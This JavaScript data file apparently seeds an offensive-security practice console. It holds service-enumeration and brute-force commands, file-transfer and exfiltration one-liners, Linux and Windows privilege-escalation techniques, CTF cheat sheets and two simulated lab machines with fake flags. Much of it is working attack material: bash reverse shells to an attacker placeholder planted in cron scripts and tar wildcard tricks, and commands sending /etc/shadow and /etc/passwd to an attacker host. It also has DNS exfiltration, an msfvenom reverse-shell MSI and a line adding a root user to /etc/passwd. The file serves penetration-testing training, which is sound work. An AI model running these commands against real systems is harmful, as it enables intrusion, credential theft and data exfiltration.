// Default comprehensive dataset for RANGE // Offensive Security Practice Console

export const initialServices = [
  { name: "HTTP / HTTPS", port: "80,443", cat: "web", enum: ["whatweb -a 3 http://<TARGET>", "nikto -h http://<TARGET>", "gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt", "ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<TARGET>/FUZZ"], notes: "The most common entry point on any box — start here for any target exposing 80/443, then work through the app for injection, upload, auth and access-control issues." },
  { name: "FTP", port: "21", cat: "file", enum: ["nmap -p21 -sC -sV <TARGET>", "ftp <TARGET>   # try anonymous:anonymous", "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<TARGET>"], notes: "Anonymous login, writable dirs to plant a webshell if FTP root overlaps webroot, cleartext creds sniffable." },
  { name: "SSH", port: "22", cat: "remote", enum: ["nmap -p22 -sC -sV <TARGET>", "ssh-audit <TARGET>", "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET>"], notes: "Weak/reused creds, key-based auth misconfig, old versions with known CVEs (e.g. libssh auth bypass), user enumeration via timing." },
  { name: "Telnet", port: "23", cat: "remote", enum: ["nmap -p23 -sC -sV <TARGET>", "telnet <TARGET>"], notes: "Cleartext protocol — sniff credentials on the wire; default creds common on embedded devices." },
  { name: "SMTP", port: "25,465,587", cat: "mail", enum: ["nmap -p25 --script smtp-enum-users <TARGET>", "smtp-user-enum -M VRFY -U userlist.txt -t <TARGET>", "nc -vn <TARGET> 25"], notes: "VRFY/EXPN user enumeration, open relay testing, email spoofing." },
  { name: "DNS", port: "53", cat: "infra", enum: ["dig axfr @<TARGET> domain.local", "dnsrecon -d domain.local -n <TARGET>", "dnsenum --dnsserver <TARGET> domain.local"], notes: "Zone transfer (AXFR) misconfig leaks the whole zone; subdomain brute-forcing reveals internal hostnames." },
  { name: "DHCP", port: "67,68", cat: "infra", enum: ["nmap --script broadcast-dhcp-discover"], notes: "Rogue DHCP / starvation attacks in internal network assessments; mostly out of scope for single-host CTF." },
  { name: "TFTP", port: "69", cat: "file", enum: ["nmap -sU -p69 --script tftp-enum <TARGET>", "tftp <TARGET> -c get config.bin"], notes: "No auth by design — pull configs (routers/switches often store creds), or push a payload if writable." },
  { name: "IPP / CUPS / JetDirect", port: "631,9100", cat: "infra", enum: ["nmap -p631,9100 -sV <TARGET>"], notes: "PostScript/PJL injection for file read, printer credential capture, sometimes a foothold via Cups-Get-Classes." },
  { name: "POP3", port: "110,995", cat: "mail", enum: ["nmap -p110 -sC -sV <TARGET>", "curl -k pop3://<TARGET> --user user:pass"], notes: "Cleartext creds, mailbox contents can reveal passwords reused elsewhere." },
  { name: "RPCbind", port: "111", cat: "infra", enum: ["rpcinfo -p <TARGET>"], notes: "Enumerates other RPC services (often reveals NFS) — always check right after seeing 111 open." },
  { name: "MSRPC", port: "135", cat: "windows", enum: ["rpcdump.py <TARGET>", "nmap -p135 --script msrpc-enum <TARGET>"], notes: "Exposes named pipes/interfaces for lateral movement (PsExec, DCOM) once you have creds." },
  { name: "NetBIOS", port: "137,138,139", cat: "windows", enum: ["nbtscan <TARGET>", "enum4linux -a <TARGET>"], notes: "Hostname/domain leakage; combine with 445 for SMB enumeration." },
  { name: "IMAP", port: "143,993", cat: "mail", enum: ["nmap -p143 -sC -sV <TARGET>", "curl -k imap://<TARGET> --user user:pass"], notes: "Credential reuse from other services; mailbox loot often contains reset links / secrets." },
  { name: "SNMP", port: "161/udp", cat: "infra", enum: ["snmpwalk -c public -v1 <TARGET>", "onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <TARGET>", "snmp-check <TARGET>"], notes: "Default community strings 'public'/'private' leak process lists, routes, sometimes creds in sysDescr." },
  { name: "LDAP", port: "389,636", cat: "windows", enum: ["ldapsearch -x -H ldap://<TARGET> -b \"dc=domain,dc=local\"", "nmap -p389 --script ldap-search <TARGET>"], notes: "Anonymous bind leaks the directory tree; look for user/group info and password-in-description fields." },
  { name: "NTP", port: "123/udp", cat: "infra", enum: ["ntpq -c readlist <TARGET>", "nmap -sU -p123 --script ntp-info <TARGET>"], notes: "Mostly recon/fingerprinting; occasional NTP amplification DoS relevance." },
  { name: "IRC", port: "6667", cat: "other", enum: ["nmap -p6667 -sV --script irc-botnet-channels,irc-unrealircd-backdoor <TARGET>"], notes: "UnrealIRCd 3.2.8.1 backdoor is a classic CTF find — banner-grab the version first." },
  { name: "MSSQL", port: "1433", cat: "db", enum: ["nmap -p1433 --script ms-sql-info <TARGET>", "impacket-mssqlclient user:pass@<TARGET>", "sqsh -S <TARGET> -U sa"], notes: "xp_cmdshell for RCE if enabled/enable-able, linked server abuse, weak sa creds." },
  { name: "Oracle", port: "1521", cat: "db", enum: ["nmap -p1521 --script oracle-sid-brute <TARGET>", "odat.py all -s <TARGET>"], notes: "SID brute force, default accounts (scott/tiger), UTL_HTTP/UTL_FILE for SSRF/RCE." },
  { name: "NFS", port: "2049", cat: "file", enum: ["showmount -e <TARGET>", "mount -t nfs <TARGET>:/share /mnt/nfs"], notes: "no_root_squash lets you create a SUID root binary from the client and execute it locally for instant root." },
  { name: "MySQL", port: "3306", cat: "db", enum: ["nmap -p3306 --script mysql-info <TARGET>", "mysql -h <TARGET> -u root -p"], notes: "Empty/weak root password, LOAD_FILE/INTO OUTFILE for file read/write, UDF for RCE if FILE priv." },
  { name: "RDP", port: "3389", cat: "windows", enum: ["nmap -p3389 --script rdp-ntlm-info <TARGET>", "xfreerdp /v:<TARGET> /u:user /p:pass"], notes: "BlueKeep (CVE-2019-0708) on old builds, credential spraying, NLA downgrade." },
  { name: "Docker", port: "2375,2376", cat: "container", enum: ["curl http://<TARGET>:2375/version", "docker -H tcp://<TARGET>:2375 ps"], notes: "Unauthenticated 2375 = instant root: mount host filesystem into a new container." },
  { name: "PostgreSQL", port: "5432", cat: "db", enum: ["nmap -p5432 --script pgsql-brute <TARGET>", "psql -h <TARGET> -U postgres"], notes: "COPY ... TO/FROM PROGRAM for RCE on superuser accounts; trust-auth misconfig in pg_hba.conf." },
  { name: "VNC", port: "5900", cat: "remote", enum: ["nmap -p5900 --script vnc-info <TARGET>", "vncviewer <TARGET>"], notes: "No-auth or weak 8-char password limit; instant GUI access on success." },
  { name: "Redis", port: "6379", cat: "db", enum: ["redis-cli -h <TARGET> ping", "nmap -p6379 --script redis-info <TARGET>"], notes: "No auth by default — write an SSH key via CONFIG SET dir / SET / SAVE, or use a webshell drop for RCE." },
  { name: "Kubernetes API", port: "6443,10250", cat: "container", enum: ["curl -k https://<TARGET>:6443/version", "curl -k https://<TARGET>:10250/pods"], notes: "Anonymous API access or exposed kubelet lets you list/exec into pods — frequently a full cluster compromise." },
  { name: "Splunkd", port: "8089", cat: "other", enum: ["curl -k https://<TARGET>:8089/services/server/info"], notes: "Default admin:changeme in older instances; Splunk app deployment for RCE once authenticated." },
  { name: "Elasticsearch", port: "9200", cat: "db", enum: ["curl http://<TARGET>:9200/_cat/indices?v"], notes: "No auth by default in older setups — full data dump, and scripting engine RCE on very old CVEs." },
  { name: "WinRM", port: "5985,5986", cat: "windows", enum: ["nmap -p5985 <TARGET>", "evil-winrm -i <TARGET> -u user -p pass"], notes: "Valid creds → interactive PowerShell shell directly; check WinRM before RDP, it's often quieter/faster." },
  { name: "Kerberos", port: "88", cat: "windows", enum: ["nmap -p88 <TARGET>", "GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip <TARGET>"], notes: "AS-REP roasting (no pre-auth accounts) and Kerberoasting (SPN accounts) both yield crackable hashes offline." },
  { name: "SMB", port: "445", cat: "windows", enum: ["smbclient -L //<TARGET>/ -N", "enum4linux -a <TARGET>", "crackmapexec smb <TARGET>"], notes: "Null sessions, guest access, EternalBlue (MS17-010) on legacy hosts, writable shares for webshell drop." },
  { name: "Jenkins", port: "8080", cat: "other", enum: ["curl http://<TARGET>:8080/script"], notes: "Unauthenticated Script Console (/script) is Groovy → trivial RCE; also check for leaked creds in job configs." },
  { name: "ActiveMQ", port: "61616,8161", cat: "other", enum: ["curl http://<TARGET>:8161/admin/"], notes: "CVE-2023-46604 (OpenWire) is unauthenticated RCE — a very common CTF/real-world find." },
  { name: "AD CS", port: "445/135(RPC)", cat: "windows", enum: ["certipy find -u user@domain -p pass -dc-ip <TARGET>"], notes: "Misconfigured certificate templates (ESC1-ESC8) allow privilege escalation to Domain Admin." }
];

export const initialFileTransfer = {
  "Upload TO target": [
    { method: "Python HTTP server (attacker)", note: "Serve a file from your Kali box, then pull it from the target with curl/wget/certutil.", cmd: "python3 -m http.server 8000" },
    { method: "↳ pull with curl (Linux target)", note: "", cmd: "curl http://<ATTACKER>:8000/linpeas.sh -o /tmp/linpeas.sh" },
    { method: "↳ pull with wget (Linux target)", note: "", cmd: "wget http://<ATTACKER>:8000/linpeas.sh -O /tmp/linpeas.sh" },
    { method: "↳ pull with PowerShell (Windows target)", note: "", cmd: 'powershell -c "Invoke-WebRequest -Uri http://<ATTACKER>:8000/winPEAS.exe -OutFile C:\\Windows\\Temp\\winPEAS.exe"' },
    { method: "↳ pull with certutil (Windows, no PS needed)", note: "", cmd: "certutil -urlcache -split -f http://<ATTACKER>:8000/winPEAS.exe winPEAS.exe" },
    { method: "SMB share (attacker, Impacket)", note: "Good when Windows target has outbound SMB but not HTTP.", cmd: "impacket-smbserver share $(pwd) -smb2support" },
    { method: "↳ pull from Windows target", note: "", cmd: "copy \\\\<ATTACKER>\\share\\winPEAS.exe C:\\Windows\\Temp\\" },
    { method: "Netcat push (attacker listens)", note: "No server needed on either side — works over almost any allowed port.", cmd: "nc -lvnp 4444 > linpeas.sh" },
    { method: "↳ send from your box", note: "", cmd: "nc <TARGET> 4444 < linpeas.sh" },
    { method: "SCP (needs SSH creds)", note: "Cleanest option once you already have valid credentials.", cmd: "scp linpeas.sh user@<TARGET>:/tmp/" },
    { method: "FTP server (attacker, pyftpdlib)", note: "", cmd: "python3 -m pyftpdlib -w -p 21" },
    { method: "↳ pull from target", note: "", cmd: "ftp <ATTACKER>\n# get linpeas.sh" },
    { method: "TFTP (attacker, atftpd)", note: "Useful for network gear / embedded targets with only TFTP client available.", cmd: "atftpd --daemon --port 69 /tftpboot" },
    { method: "↳ pull from target", note: "", cmd: "tftp -i <ATTACKER> GET linpeas.sh" },
    { method: "Base64 paste (no network egress at all)", note: "For fully isolated shells — encode on attacker, paste and decode on target.", cmd: "# attacker:\nbase64 -w0 linpeas.sh\n# target:\necho '<paste base64>' | base64 -d > linpeas.sh" }
  ],
  "Exfil FROM target": [
    { method: "Python HTTP upload receiver (attacker)", note: "Quick one-liner server that accepts PUT uploads.", cmd: 'python3 -c "import http.server,socketserver;h=http.server.SimpleHTTPRequestHandler;socketserver.TCPServer((\'\',8000),h).serve_forever()"' },
    { method: "↳ push a file out with curl", note: "", cmd: "curl -F 'file=@/etc/passwd' http://<ATTACKER>:8000/upload" },
    { method: "Netcat pull (attacker)", note: "", cmd: "nc -lvnp 4444 > loot.txt" },
    { method: "↳ send from target", note: "", cmd: "nc <ATTACKER> 4444 < /etc/shadow" },
    { method: "SCP pull (needs creds)", note: "", cmd: "scp user@<TARGET>:/etc/passwd ./loot_passwd" },
    { method: "Base64 over an existing shell", note: "When you only have command execution, not a file-transfer channel.", cmd: "cat /etc/shadow | base64 -w0\n# copy the blob back on attacker and: base64 -d > shadow" },
    { method: "DNS exfil (heavily filtered environments)", note: "Last resort when only DNS egress is allowed.", cmd: "# attacker runs a DNS listener (e.g. dnschef / interactsh), target:\nfor b in $(xxd -p -c1 secret.txt); do dig $b.chunk.<ATTACKER_DOMAIN>; done" }
  ]
};

export const initialPrivescLinux = [
  { n: 1, t: "Abusing Sudo Rights", d: "Misconfigured sudoers entries (NOPASSWD, wildcard binaries, or GTFOBins-listed programs) let a low-priv user run code as root.", det: "sudo -l", exp: "# if a GTFOBins binary is allowed, e.g.:\nsudo vim -c ':!/bin/bash'\nsudo find . -exec /bin/bash \\; -quit" },
  { n: 2, t: "SUID Binaries", d: "Binaries with the SUID bit run as their owner (often root) regardless of who executes them — many have shell-escape or file-read functions.", det: "find / -perm -4000 -type f 2>/dev/null", exp: "# cross-reference results against gtfobins.github.io, e.g.:\n./find_binary -exec /bin/bash -p \\; -quit" },
  { n: 3, t: "Linux Capabilities", d: "A capability like cap_setuid on a binary can grant root-equivalent power without the full SUID bit.", det: "getcap -r / 2>/dev/null", exp: "# e.g. python3 with cap_setuid+ep:\n./python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'" },
  { n: 4, t: "LXD Privilege Escalation", d: "Membership in the lxd group is root-equivalent — you can mount the host filesystem into a privileged container.", det: "id   # look for 'lxd' group", exp: "lxc init ubuntu:18.04 priv -c security.privileged=true\nlxc config device add priv host-root disk source=/ path=/mnt/root recursive=true\nlxc start priv; lxc exec priv /bin/bash" },
  { n: 5, t: "Docker Privilege Escalation", d: "Membership in the docker group is also root-equivalent — spin up a container with the host's / bind-mounted.", det: "id   # look for 'docker' group", exp: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh" },
  { n: 6, t: "Exploiting Cron Jobs", d: "A root cron job that runs a world-writable script, or references a binary via a relative/incomplete PATH, can be hijacked.", det: "cat /etc/crontab; ls -la /etc/cron.*; pspy64   # to catch jobs live", exp: "echo 'bash -i >&/dev/tcp/<ATTACKER>/4444 0>&1' >> /path/to/writable_cron_script.sh" },
  { n: 7, t: "Writable /etc/passwd", d: "If /etc/passwd is writable, you can add a new root-equivalent user with a self-chosen password hash.", det: "ls -la /etc/passwd", exp: "openssl passwd -1 -salt xx password123\necho 'hacker:$1$xx$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker" },
  { n: 8, t: "Misconfigured NFS", d: "An NFS export with no_root_squash lets a client-side root user create a SUID root binary that executes as root once run locally on the target.", det: "cat /etc/exports   # on the NFS server; showmount -e <TARGET> from attacker", exp: "# on attacker (has root):\nmkdir /mnt/nfs && mount -t nfs <TARGET>:/share /mnt/nfs\ncp /bin/bash /mnt/nfs/rootbash && chmod +xs /mnt/nfs/rootbash\n# on target:\n/share/rootbash -p" },
  { n: 9, t: "Exploiting Wildcard Injection", d: "Scripts that pass an unquoted wildcard (*) to tar/chown/rsync can be tricked by filenames crafted as command flags.", det: "cat /path/to/root_cron_script.sh   # look for unquoted * with tar/chown/rsync", exp: "echo 'bash -i >&/dev/tcp/<ATTACKER>/4444 0>&1' > shell.sh; chmod +x shell.sh\ntouch -- '--checkpoint=1'\ntouch -- '--checkpoint-action=exec=sh shell.sh'" },
  { n: 10, t: "LD_PRELOAD", d: "If sudo env_keep+=LD_PRELOAD is set, you can force a privileged binary to load your own shared library first.", det: "sudo -l   # look for env_keep+=LD_PRELOAD", exp: "echo -e '#include <stdio.h>\\n#include <stdlib.h>\\n#include <unistd.h>\\nvoid _init(){unsetenv(\"LD_PRELOAD\");setgid(0);setuid(0);system(\"/bin/bash -p\");}' > x.c\ngcc -fPIC -shared -o x.so x.c -nostartfiles\nsudo LD_PRELOAD=/path/x.so <allowed_binary>" },
  { n: 11, t: "Polkit (CVE-2021-3560)", d: "A race condition in polkit's D-Bus authentication lets an unprivileged user create a new admin-group user.", det: "pkaction --version", exp: "# public PoC (CVE-2021-3560) creates a sudo-capable user via dbus-send race condition" },
  { n: 12, t: "PwnKit (CVE-2021-4034)", d: "A memory-corruption bug in pkexec lets any local user obtain a root shell with a single crafted execve() call.", det: "pkexec --version   # check if patched", exp: "# public CVE-2021-4034 PoC (PwnKit) compiled and run directly grants an instant root shell" },
  { n: 13, t: "DirtyPipe (CVE-2022-0847)", d: "A Linux kernel pipe-buffer flaw (5.8–5.16) lets an unprivileged user overwrite data in read-only files.", det: "uname -r   # affected: 5.8 to 5.16.11", exp: "# public CVE-2022-0847 PoC overwrites /usr/bin/su (or similar SUID binary) to drop a root shell" }
];

export const initialPrivescWindows = [
  { n: 1, t: "Unquoted Service Path", d: "A service binary path containing spaces but no quotes lets Windows try each space-delimited segment as an executable.", det: 'wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\\\Windows\\\\"', exp: "# drop a malicious exe at the ambiguous path segment, e.g. C:\\Program.exe, then restart the service" },
  { n: 2, t: "Weak Service Permissions", d: "If you have write access to a service's binary or config, replace it and restart the service to run as SYSTEM.", det: 'accesschk.exe -uwcqv "Authenticated Users" *   (Sysinternals)', exp: 'sc config <svc> binpath= "C:\\Windows\\Temp\\shell.exe"\nsc start <svc>' },
  { n: 3, t: "AlwaysInstallElevated", d: "Two registry keys, if both set to 1, let any user install an MSI package with SYSTEM privileges.", det: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", exp: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=4444 -f msi -o shell.msi\nmsiexec /quiet /qn /i shell.msi" },
  { n: 4, t: "Stored / Autologon Credentials", d: "Passwords are sometimes left in registry autologon keys, unattended install files, or PowerShell history.", det: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"\ntype C:\\Windows\\Panther\\Unattend.xml', exp: "# reuse recovered creds with runas /user:Administrator cmd, or PsExec/WinRM as that user" },
  { n: 5, t: "Token Impersonation (JuicyPotato / PrintSpoofer)", d: "Service accounts holding SeImpersonatePrivilege can coerce a SYSTEM token via a COM/NTLM relay trick.", det: "whoami /priv   # look for SeImpersonatePrivilege = Enabled", exp: "PrintSpoofer.exe -i -c cmd\n# or JuicyPotatoNG / GodPotato depending on OS build" }
];

export const initialCtfCategories = [
  {
    id: "web",
    title: "Web Exploitation",
    levels: {
      Easy: {
        desc: "Source visible in view-source, simple auth bypass, obvious hidden parameters or cookies.",
        cmds: [
          { l: "View page source / comments", c: "curl -s http://<TARGET>/ | grep -iE 'flag|todo|debug|comment'" },
          { l: "Check robots.txt and common hidden files", c: "curl -s http://<TARGET>/robots.txt\ncurl -s http://<TARGET>/.git/config" },
          { l: "Decode an obvious cookie", c: "echo '<paste_cookie_value>' | base64 -d" },
          { l: "Basic directory brute force", c: "gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt" }
        ]
      },
      Medium: {
        desc: "Requires chaining 2+ steps: SQLi to auth bypass, IDOR to admin panel, or a template injection.",
        cmds: [
          { l: "sqlmap full pipeline", c: 'sqlmap -u "http://<TARGET>/item?id=1" --batch --dump' },
          { l: "SSTI probe (Jinja2/Twig/etc.)", c: "http://<TARGET>/render?name={{7*7}}" },
          { l: "IDOR id sweep with ffuf", c: 'ffuf -u "http://<TARGET>/api/user/FUZZ" -w <(seq 1 200) -H "Cookie: session=<sess>"' },
          { l: "JWT tampering (alg=none / weak secret)", c: "# decode\necho '<jwt_part2>' | base64 -d\n# crack HS256 secret\nhashcat -m 16500 jwt.txt rockyou.txt" }
        ]
      },
      Hard: {
        desc: "Multi-stage chains: blind SSRF into cloud metadata, deserialization RCE, or race conditions.",
        cmds: [
          { l: "Blind SSRF via OOB listener", c: "# start listener\npython3 -m http.server 8000\n# trigger from the app pointing at your box" },
          { l: "Java/PHP deserialization RCE (ysoserial)", c: "java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,payload}|{base64,-d}|bash' > payload.bin" },
          { l: "Race condition (parallel requests)", c: "for i in $(seq 1 50); do curl -s http://<TARGET>/redeem -d 'code=X' & done; wait" },
          { l: "HTTP request smuggling probe", c: "curl -v --path-as-is http://<TARGET>/ -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4'" }
        ]
      }
    }
  },
  {
    id: "pwn",
    title: "Binary Exploitation (Pwn)",
    levels: {
      Easy: {
        desc: "No protections (no PIE/canary/NX), simple stack buffer overflow controlling EIP/RIP directly.",
        cmds: [
          { l: "Check binary protections", c: "checksec --file=./chall" },
          { l: "Find the overflow offset", c: "cyclic 200 > pattern.txt\ngdb -q ./chall\nrun < pattern.txt\ncyclic -l <EIP_value_found>" },
          { l: "Build a basic ret2win payload", c: "python3 -c \"from pwn import *; p=process('./chall'); p.sendline(b'A'*40 + p64(0xdeadbeef)); p.interactive()\"" },
          { l: "Send to remote target", c: "nc <TARGET> 9001" }
        ]
      },
      Medium: {
        desc: "NX enabled — build a ret2libc chain, or defeat a basic stack canary / format string leak.",
        cmds: [
          { l: "Leak a libc address via format string", c: "python3 -c \"from pwn import *; p=remote('<TARGET>',9001); p.sendline(b'%7\\$p'); print(p.recvline())\"" },
          { l: "Build ret2libc chain", c: "python3 -c \"from pwn import *; libc=ELF('libc.so.6'); pop_rdi=0xdeadbeef; payload=b'A'*40+p64(pop_rdi)+p64(next(libc.search(b'/bin/sh')))+p64(libc.sym['system']); print(payload)\"" },
          { l: "ROPgadget to find gadgets", c: "ROPgadget --binary ./chall --only 'pop|ret'" }
        ]
      },
      Hard: {
        desc: "Full RELRO + PIE + canary + NX — heap exploitation (UAF, double-free) or ret2csu / SROP required.",
        cmds: [
          { l: "Heap chunk visualization", c: "gdb -q ./chall\npwndbg> heap\npwndbg> bins" },
          { l: "SROP (sigreturn oriented programming)", c: "python3 -c \"from pwn import *; frame=SigreturnFrame(); frame.rax=59; frame.rdi=binsh_addr; frame.rsi=0; frame.rdx=0; print(bytes(frame))\"" },
          { l: "One-gadget for a clean shell", c: "one_gadget libc.so.6" }
        ]
      }
    }
  },
  {
    id: "crypto",
    title: "Cryptography",
    levels: {
      Easy: {
        desc: "Classic ciphers (Caesar/Vigenère/XOR with a short key), Base-N encoding chains.",
        cmds: [
          { l: "Auto-decode mystery blob", c: "echo '<ciphertext>' | cyberchef   # or python base64.b64decode" },
          { l: "Brute-force single-byte XOR", c: "python3 -c \"data=bytes.fromhex('<hex>'); [print(k, bytes(b^k for b in data)) for k in range(256)]\"" }
        ]
      },
      Medium: {
        desc: "RSA with small/shared parameters, weak AES mode (ECB pattern leakage), hash-length extension.",
        cmds: [
          { l: "Factor small RSA modulus", c: "python3 -c \"from sympy import factorint; print(factorint(N))\"" },
          { l: "RsaCtfTool attack", c: "python3 RsaCtfTool.py --publickey key.pub --uncipherfile flag.enc" }
        ]
      },
      Hard: {
        desc: "Custom/broken crypto scheme: padding oracle, lattice attack, ECC nonce reuse.",
        cmds: [
          { l: "Padding oracle attack", c: "python3 padding_oracle_exploit.py --url http://<TARGET>/decrypt --ciphertext <hex>" }
        ]
      }
    }
  },
  {
    id: "forensics",
    title: "Forensics & Steganography",
    levels: {
      Easy: {
        desc: "Flag hidden in file metadata, simple carve from disk/memory, or appended after EOF.",
        cmds: [
          { l: "Inspect file metadata", c: "exiftool suspicious.jpg" },
          { l: "Identify embedded files", c: "binwalk -e suspicious.bin" },
          { l: "Extract strings", c: "strings memory.dmp | grep -i 'flag{'" }
        ]
      },
      Medium: {
        desc: "PCAP analysis to reconstruct a session, or Volatility memory dump analysis.",
        cmds: [
          { l: "Follow TCP stream in pcap", c: "tshark -r capture.pcapng -q -z follow,tcp,ascii,0" },
          { l: "Volatility 3 process list", c: "volatility3 -f memory.dmp windows.pslist\nvolatility3 -f memory.dmp windows.hashdump" }
        ]
      },
      Hard: {
        desc: "Anti-forensics applied (timestomp, encrypted container, deleted+overwritten data).",
        cmds: [
          { l: "Timeline analysis", c: "log2timeline.py timeline.plaso disk.img\npsort.py -w timeline.csv timeline.plaso" }
        ]
      }
    }
  }
];

export const initialMachines = [
  {
    id: "demo-whisper",
    name: "Whisper",
    os: "Linux",
    difficulty: "Easy",
    ip: "10.10.11.42",
    description: "A beginner box: an outdated CMS gives a foothold, and a misconfigured sudo rule finishes the job.",
    steps: [
      {
        context: "kali",
        title: "Recon the box",
        hint: "Start with a full port/version scan.",
        expected: "nmap",
        output: "PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n\n[+] Both ports look worth a closer look — try the web server next.",
        switchContext: false,
        flag: ""
      },
      {
        context: "kali",
        title: "Enumerate the web app",
        hint: "Brute-force directories on port 80 using gobuster or ffuf.",
        expected: "gobuster",
        output: "/admin                (Status: 200)\n/uploads              (Status: 200)\n/changelog.txt        (Status: 200)\n\n[+] changelog.txt mentions 'SimpleCMS 2.1' — that version has a known unauthenticated file upload.",
        switchContext: false,
        flag: ""
      },
      {
        context: "kali",
        title: "Exploit the file upload",
        hint: "Upload a PHP reverse shell through /uploads, then trigger it with curl.",
        expected: "curl",
        output: "[+] Payload uploaded to /uploads/shell.php\n[+] Triggering it now...\nConnection received on 10.10.14.5 4444\n\n[+] You now have a shell as www-data on the target.",
        switchContext: true,
        flag: ""
      },
      {
        context: "machine",
        title: "Look for a privesc path",
        hint: "Check what you can run as another user without a password.",
        expected: "sudo -l",
        output: "Matching Defaults entries for www-data on whisper:\n    !env_reset\nUser www-data may run the following commands on whisper:\n    (root) NOPASSWD: /usr/bin/python3 /opt/backup.py\n\n[+] That script runs as root with no password — check GTFOBins for python3.",
        switchContext: false,
        flag: ""
      },
      {
        context: "machine",
        title: "Escalate to root",
        hint: 'GTFOBins shows a sudo python3 escape: sudo python3 -c \'import os;os.system("/bin/bash")\'',
        expected: "sudo python3",
        output: "# whoami\nroot\n\n# cat /root/root.txt\nTHM{wh1sp3r_1n_th3_l0gs}\n\n🏆 Root shell obtained — machine fully compromised.",
        switchContext: false,
        flag: "THM{wh1sp3r_1n_th3_l0gs}"
      }
    ]
  },
  {
    id: "demo-sentinel",
    name: "Sentinel",
    os: "Windows",
    difficulty: "Medium",
    ip: "10.10.11.89",
    description: "Active Directory lab: SMB anonymous share exploration leads to stored creds, followed by SeImpersonatePrivilege exploitation.",
    steps: [
      {
        context: "kali",
        title: "Scan SMB shares",
        hint: "Enumerate SMB shares with null credentials using smbclient or crackmapexec.",
        expected: "smbclient",
        output: "Sharename       Type      Comment\n---------       ----      -------\nADMIN$          DISK      Remote Admin\nC$              DISK      Default share\nPublic          DISK      Public Documents and Tools\nIPC$            IPC       Remote IPC\n\n[+] Anonymous read access granted on 'Public'.",
        switchContext: false,
        flag: ""
      },
      {
        context: "kali",
        title: "Download backup configs",
        hint: "Use smbclient to download web.config from the Public share.",
        expected: "get web.config",
        output: "getting file \\Public\\web.config as web.config (2.4 kb/s)\n[+] Leaked credentials in config: svc_web / Password123!",
        switchContext: false,
        flag: ""
      },
      {
        context: "kali",
        title: "Log in via WinRM",
        hint: "Connect with evil-winrm using recovered credentials.",
        expected: "evil-winrm",
        output: "*Evil-WinRM* PS C:\\Users\\svc_web\\Documents> \n[+] Interactive WinRM session established as svc_web.",
        switchContext: true,
        flag: ""
      },
      {
        context: "machine",
        title: "Check privileges",
        hint: "Run whoami /priv to inspect assigned token privileges.",
        expected: "whoami /priv",
        output: "Privilege Name                Description                    State\n============================= ============================== =======\nSeImpersonatePrivilege        Impersonate a client after auth Enabled\n\n[+] SeImpersonatePrivilege is enabled! Target PrintSpoofer or GodPotato.",
        switchContext: false,
        flag: ""
      },
      {
        context: "machine",
        title: "Escalate to NT AUTHORITY\\SYSTEM",
        hint: "Run PrintSpoofer.exe to trigger named pipe impersonation.",
        expected: "printspoofer",
        output: "[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe created...\n[+] Got SYSTEM token!\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\Users\\Administrator\\Desktop> type root.txt\nHTB{s3nt1n3l_t0k3n_1mp3rs0n4t10n_succ3ss}\n\n🏆 Machine fully compromised!",
        switchContext: false,
        flag: "HTB{s3nt1n3l_t0k3n_1mp3rs0n4t10n_succ3ss}"
      }
    ]
  }
];

export const initialCustomSections = [];
export const initialNotebookTopics = [];
